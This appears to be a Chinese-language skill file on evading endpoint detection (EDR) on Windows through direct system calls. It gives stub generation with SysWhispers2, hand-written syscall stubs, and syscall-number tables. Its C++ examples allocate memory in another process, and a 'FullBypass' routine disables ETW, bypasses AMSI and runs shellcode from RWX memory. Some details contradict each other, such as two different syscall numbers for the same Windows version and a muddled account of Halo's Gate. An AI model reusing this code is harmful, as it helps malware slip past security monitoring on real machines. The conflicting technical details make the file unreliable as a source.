---
name: "syscall-techniques"
description: "Direct system call techniques to bypass userland API hooks set by EDR solutions"
version: "1.0.0"
---

# Syscall Techniques

> 直接系统调用（syscalls）是一种用于绕过EDR解决方案设置的用户态API挂钩的技术。通过直接调用内核函数，恶意软件可以逃避用户态检测。

## 概述

在现代Windows（64位）中，用户态对ntdll.dll函数（如 `NtAllocateVirtualMemory`、`NtCreateThread`）的调用只是存根包装器，最终通过系统调用调用内核。

### 调用流程

```
应用程序
    ↓
ntdll!NtAllocateVirtualMemory (用户态存根)
    ↓
mov r10, rcx              ; 设置
mov eax, 0x18             ; 系统调用号（SSN）
syscall                   ; 转换到内核
ret                       ; 返回
    ↓
nt!NtAllocateVirtualMemory (内核)
```

### 系统调用号（SSN）

每个系统调用有一个唯一的编号，在Windows版本之间会变化：
- Windows 10 1809: `NtAllocateVirtualMemory` = 0x18
- Windows 10 1909: `NtAllocateVirtualMemory` = 0x1B
- Windows 10 21H1: `NtAllocateVirtualMemory` = 0x16

## 为什么使用Syscalls

### 用户态API挂钩

EDR解决方案经常挂钩ntdll.dll函数来监控和控制执行：

```
ntdll!NtAllocateVirtualMemory ← EDR挂钩
    ↓
检查参数
    ↓
记录调用
    ↓
如果可疑则阻止
    ↓
或转发到原始函数
```

### 直接Syscall绕过

通过直接调用内核：

```
你的代码
    ↓
直接系统调用（无用户态挂钩）
    ↓
nt!NtAllocateVirtualMemory (内核)
    ↓
绕过EDR挂钩！
```

## SysWhispers2

SysWhispers2自动化直接系统调用生成和SSN解析。

### 安装

```bash
git clone https://github.com/jtwray727/syswhispers2.git
cd syswhispers2
pip install -r requirements.txt
```

### 使用

#### 生成系统调用存根

```python
python syswhispers.py --syscall NtAllocateVirtualMemory \
                     --out-file syscalls.c \
                     --headers syscalls.h
```

生成：

```c
EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);
```

#### 生成多个系统调用

```python
python syswhispers.py \
    --syscall NtAllocateVirtualMemory,NtCreateThreadEx,NtWriteVirtualMemory \
    --out-file my_syscalls.c \
    --headers my_syscalls.h
```

### 工作原理

1. 通过解析ntdll.dll导出动态解析SSN
2. 定位`syscall`指令
3. 生成绕过挂钩包装器的存根
4. 自动处理不同的Windows版本

### 使用示例

```cpp
#include "my_syscalls.h"

void InjectViaSyscall() {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    LPVOID pMem = NULL;
    SIZE_T size = 4096;

    // 直接系统调用而非VirtualAllocEx
    NTSTATUS status = NtAllocateVirtualMemory(
        hProcess,
        &pMem,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (status == 0) {
        printf("[+] Allocated memory via syscall\n");
    }

    CloseHandle(hProcess);
}
```

## 手动Syscall实现

### 基本Syscall存根

```cpp
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS ManualNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    void* pNtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

    // 动态计算SSN
    DWORD ssn = GetSyscallNumber((LPBYTE)pNtAllocateVirtualMemory);

    NTSTATUS result;
    __asm {
        mov r10, rcx
        mov eax, ssn
        syscall
        mov result, eax
    }

    return result;
}

// 通过搜索syscall指令查找系统调用号
DWORD GetSyscallNumber(LPBYTE funcPtr) {
    // 搜索"mov eax, SSN; syscall"模式
    // 通常在函数开始后第4个偏移
    return *(DWORD*)(funcPtr + 4);
}
```

### 多版本支持

```cpp
typedef struct {
    DWORD majorVersion;
    DWORD minorVersion;
    DWORD buildNumber;
    DWORD ssn;
} SSN_ENTRY;

SSN_ENTRY ssnTable[] = {
    {10, 0, 18362, 0x18}, // Windows 10 1909
    {10, 0, 19041, 0x1A}, // Windows 10 2004
    {10, 0, 21343, 0x16}, // Windows 10 21H1
};

DWORD GetSSNForCurrentOS() {
    RTL_OSVERSIONINFOEXW versionInfo = {0};
    versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
    RtlGetVersion((PRTL_OSVERSIONINFOW)&versionInfo);

    // 查找匹配的SSN
    for (int i = 0; i < sizeof(ssnTable) / sizeof(SSN_ENTRY); i++) {
        if (versionInfo.dwMajorVersion == ssnTable[i].majorVersion &&
            versionInfo.dwMinorVersion == ssnTable[i].minorVersion &&
            versionInfo.dwBuildNumber == ssnTable[i].buildNumber)
        {
            return ssnTable[i].ssn;
        }
    }

    return -1; // 未知操作系统
}
```

## Halo's Gate

Halo's Gate是一种高级技术，在系统调用执行期间绕过ETW和AMSI监控。

### 概念

不使用ntdll.dll中的syscall指令（被监控），Halo's Gate：

1. 在内核空间中找到原始、未挂钩的syscall指令
2. 直接跳转到这里
3. 从受监控区域执行syscall

## ETW和AMSI绕过

Syscall通常与ETW和AMSI绕过结合使用：

```cpp
void FullBypass() {
    // 1. 禁用ETW（如果需要）
    DisableETW();

    // 2. 绕过AMSI（如果使用PowerShell/.NET）
    BypassAMSI();

    // 3. 使用syscall
    LPVOID pMem = NULL;
    SIZE_T size = 4096;
    NtAllocateVirtualMemory(GetCurrentProcess(), &pMem, 0, &size,
                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 4. 执行shellcode
    if (pMem) {
        memcpy(pMem, shellcode, shellcodeSize);
        ((void(*)())pMem)();
    }
}
```

## 限制

### 内核级监控

某些EDR解决方案（如CrowdStrike Falcon）也挂钩内核函数（nt!NtAllocateVirtualMemory）。在这种情况下：
- Syscall可能仍被拦截
- 用户态unhook（从磁盘恢复ntdll.dll）通常与syscall结合使用

### 检测

EDR可能监控：
- 对ntdll.dll syscall指令的直接调用
- 汇编模式（如`syscall; ret`序列）
- 可疑的SSN查找行为（解析导出、搜索字节）

### 版本依赖

使用硬编码SSN仅在特定Windows版本上工作。使用策略：
- 动态SSN解析（SysWhispers2）
- 如果syscall失败则回退到正常API
- 在使用syscall之前进行版本检测

## 参考资源

- [SysWhispers2](https://github.com/jtwray727/syswhispers2) - 直接系统调用生成器
- [Halo's Gate](https://github.com/am0nsec/HwB) - 高级系统调用免杀
- [PayloadsAllTheThings - Direct Syscalls](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Direct%20System%20Calls.md)
- [Mandiant - Hunting for Shadowed Memory](https://www.mandiant.com/resources/blog/hunting-shadowed-memory)
